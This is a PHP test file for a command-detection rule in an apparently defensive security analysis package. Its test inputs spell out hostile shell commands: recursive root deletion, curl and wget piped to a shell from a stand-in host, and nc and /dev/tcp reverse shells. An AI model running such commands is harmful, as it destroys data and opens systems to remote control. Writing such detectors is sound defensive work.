<?php

declare(strict_types=1);

use Laronclad\Analysis\ConfidenceLevel;
use Laronclad\Analysis\Rules\DangerousCommandRule;
use Laronclad\Analysis\ThreatType;

function dangerousRule(): DangerousCommandRule
{
    return new DangerousCommandRule;
}

it('exposes its identity', function () {
    expect(dangerousRule()->name())->toBe('dangerous_command');
    expect(dangerousRule()->type())->toBe(ThreatType::ProcessExecution);
    expect(dangerousRule()->confidence())->toBe(ConfidenceLevel::Medium);
});

it('matches rm -rf /', function () {
    expect(dangerousRule()->matches('rm -rf /'))->not->toBeNull();
});

it('matches rm -rf / with arguments', function () {
    expect(dangerousRule()->matches('rm -rf / --no-preserve-root'))->not->toBeNull();
});

it('matches curl piped to sh', function () {
    expect(dangerousRule()->matches('curl https://evil.example/payload | sh'))->not->toBeNull();
});

it('matches wget piped to bash', function () {
    expect(dangerousRule()->matches('wget -O- https://evil.example | bash'))->not->toBeNull();
});

it('matches reverse shell with nc -e', function () {
    expect(dangerousRule()->matches('nc -e /bin/sh 10.0.0.1 4444'))->not->toBeNull();
});

it('matches bash -i', function () {
    expect(dangerousRule()->matches('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'))->not->toBeNull();
});

it('matches /dev/tcp/', function () {
    expect(dangerousRule()->matches('cat < /dev/tcp/10.0.0.1/4444'))->not->toBeNull();
});

it('matches chmod 777', function () {
    expect(dangerousRule()->matches('chmod 777 /var/www/html'))->not->toBeNull();
});

it('does not match ls', function () {
    expect(dangerousRule()->matches('ls -la'))->toBeNull();
});

it('does not match cat on a file', function () {
    expect(dangerousRule()->matches('cat /var/log/app.log'))->toBeNull();
});

it('does not match a plain git command', function () {
    expect(dangerousRule()->matches('git status'))->toBeNull();
});
